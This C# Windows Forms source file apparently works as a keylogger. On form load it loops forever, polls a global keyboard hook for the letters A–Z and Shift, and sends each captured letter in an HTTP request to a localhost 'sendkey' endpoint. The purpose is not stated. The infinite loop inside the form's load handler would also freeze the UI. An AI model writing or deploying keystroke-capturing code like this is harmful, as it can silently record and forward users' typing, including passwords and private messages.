using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;
using Dapplo.Windows.Input;
using Dapplo.Windows.Input.Enums;
using Dapplo.Windows.Input.Structs;
using System.Threading;

namespace WindowsFormsApp3
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            while (true)
            {
                if (KeyboardHook.IsPressed(Keys.A))
                {
                    
                    if(KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("A");
                    }else
                    {
                        sendkey("a");
                    }
                    Thread.Sleep(150);
                } else if(KeyboardHook.IsPressed(Keys.B))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("B");
                    }
                    else
                    {
                        sendkey("b");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.C))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("C");
                    }
                    else
                    {
                        sendkey("c");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.D))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("D");
                    }
                    else
                    {
                        sendkey("d");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.E))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("E");
                    }
                    else
                    {
                        sendkey("e");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.F))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("F");
                    }
                    else
                    {
                        sendkey("f");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.G))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("G");
                    }
                    else
                    {
                        sendkey("g");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.H))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("H");
                    }
                    else
                    {
                        sendkey("h");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.I))
                {
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("I");
                    }
                    else
                    {
                        sendkey("i");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.J))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("J");
                    }
                    else
                    {
                        sendkey("j");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.K))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("K");
                    }
                    else
                    {
                        sendkey("k");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.L))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("L");
                    }
                    else
                    {
                        sendkey("l");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.M))
                {
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("M");
                    }
                    else
                    {
                        sendkey("m");
                    }
                    Thread.Sleep(150);

                }
                else if (KeyboardHook.IsPressed(Keys.N))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("N");
                    }
                    else
                    {
                        sendkey("n");
                    }
                    Thread.Sleep(150);

                }
                else if (KeyboardHook.IsPressed(Keys.O))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("O");
                    }
                    else
                    {
                        sendkey("o");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.P))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("P");
                    }
                    else
                    {
                        sendkey("p");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.Q))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("Q");
                    }
                    else
                    {
                        sendkey("q");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.R))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("R");
                    }
                    else
                    {
                        sendkey("r");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.S))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("S");
                    }
                    else
                    {
                        sendkey("s");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.T))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("T");
                    }
                    else
                    {
                        sendkey("t");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.U))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("U");
                    }
                    else
                    {
                        sendkey("u");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.V))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("V");
                    }
                    else
                    {
                        sendkey("v");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.W))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("W");
                    }
                    else
                    {
                        sendkey("w");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.X))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("X");
                    }
                    else
                    {
                        sendkey("x");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.Y))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("Y");
                    }
                    else
                    {
                        sendkey("y");
                    }
                    Thread.Sleep(150);
                }
                else if (KeyboardHook.IsPressed(Keys.Z))
                {
                    
                    if (KeyboardHook.IsPressed(Keys.LShiftKey))
                    {
                        sendkey("Z");
                    }
                    else
                    {
                        sendkey("z");
                    }
                    Thread.Sleep(150);
                }
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void sendkey(string q)
        {
            string hello = "http://localhost/sendkey?key="+q;
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(hello);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream resStream = response.GetResponseStream();
        }
    }
}
